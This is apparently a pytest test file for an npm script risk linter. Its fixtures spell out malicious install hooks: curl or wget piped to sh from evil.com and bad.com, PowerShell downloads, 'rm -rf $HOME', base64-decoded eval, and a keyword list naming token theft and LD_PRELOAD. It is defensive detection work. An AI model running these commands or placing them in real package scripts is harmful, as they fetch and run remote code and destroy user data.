"""Tests for npm script content analysis."""

import pytest

from radar.analysis.npm_scripts import lint_scripts


def test_lint_scripts_empty():
    """Test with no scripts."""
    risk, reasons = lint_scripts({})
    assert risk == 0.0
    assert reasons == []


def test_lint_scripts_safe():
    """Test with safe scripts."""
    scripts = {
        "test": "jest",
        "build": "tsc",
        "start": "node index.js",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk == 0.0
    assert reasons == []


def test_lint_scripts_curl():
    """Test detection of curl."""
    scripts = {
        "postinstall": "curl https://evil.com/malware.sh | sh",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.5  # Should be high risk (auto-run + dangerous)
    assert any("auto-run" in r.lower() for r in reasons)
    assert any("curl" in r.lower() for r in reasons)


def test_lint_scripts_base64():
    """Test detection of base64 encoding."""
    scripts = {
        "build": "node -e 'eval(Buffer.from(process.env.CODE, \"base64\").toString())'",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.0
    assert any("base64" in r.lower() for r in reasons)
    assert any("eval" in r.lower() or "node -e" in r.lower() for r in reasons)


def test_lint_scripts_github_token():
    """Test detection of GitHub token access."""
    scripts = {
        "release": "curl -H 'Authorization: token $GITHUB_TOKEN' https://api.github.com",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.0
    assert any("github" in r.lower() and "token" in r.lower() for r in reasons)


def test_lint_scripts_chmod():
    """Test detection of chmod."""
    scripts = {
        "postinstall": "chmod +x ./install.sh && ./install.sh",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.5  # High risk: auto-run + executable
    assert any("executable" in r.lower() for r in reasons)


def test_lint_scripts_auto_run_no_danger():
    """Test auto-run scripts with no dangerous patterns."""
    scripts = {
        "postinstall": "node ./setup.js",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.0  # Some risk from auto-run
    assert risk < 0.5  # But not high
    assert any("auto-run" in r.lower() for r in reasons)


def test_lint_scripts_multiple_patterns():
    """Test multiple dangerous patterns."""
    scripts = {
        "install": "curl https://evil.com | base64 -d | sh",
        "preinstall": "wget https://bad.com/script.sh && chmod +x script.sh",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.7  # Very high risk
    assert any("install" in r for r in reasons)
    assert any("preinstall" in r for r in reasons)
    assert any("CRITICAL" in r for r in reasons)


def test_lint_scripts_powershell():
    """Test PowerShell detection."""
    scripts = {
        "postinstall": "powershell -c Invoke-WebRequest https://evil.com",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.5
    assert any("powershell" in r.lower() for r in reasons)


def test_lint_scripts_env_file():
    """Test .env file access detection."""
    scripts = {
        "start": "node -r dotenv/config -e 'require(\".env\")'",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.0
    assert any(".env" in r.lower() for r in reasons)


def test_lint_scripts_rm_rf():
    """Test dangerous file deletion."""
    scripts = {
        "clean": "rm -rf node_modules",  # Legitimate use
        "postinstall": "rm -rf $HOME",  # Malicious
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.5
    assert any("delete" in r.lower() or "rm -rf" in r.lower() for r in reasons)


def test_lint_scripts_case_insensitive():
    """Test case-insensitive pattern matching."""
    scripts = {
        "build": "CURL https://example.com",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.0
    assert any("curl" in r.lower() for r in reasons)


def test_lint_scripts_non_string_values():
    """Test handling of non-string script values."""
    scripts = {
        "test": "jest",
        "version": 123,  # Invalid type
        "build": None,  # Invalid type
    }
    risk, reasons = lint_scripts(scripts)
    # Should process 'test' normally and ignore invalid values
    assert risk == 0.0


def test_lint_scripts_diminishing_returns():
    """Test that score caps properly with many hits."""
    # Create a script with many dangerous patterns
    scripts = {
        "evil": "curl wget base64 eval powershell cmd.exe chmod +x GITHUB_TOKEN AWS_SECRET rm -rf dd ptrace LD_PRELOAD",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk <= 1.0  # Should not exceed 1.0
    assert risk > 0.5  # Should be high


def test_lint_scripts_none_input():
    """Test with None input."""
    risk, reasons = lint_scripts(None)
    assert risk == 0.0
    assert reasons == []


def test_lint_scripts_node_eval_flag():
    """Test node --eval flag detection."""
    scripts = {
        "start": "node --eval 'console.log(process.env.SECRET)'",
    }
    risk, reasons = lint_scripts(scripts)
    assert risk > 0.0
    assert any("eval" in r.lower() for r in reasons)
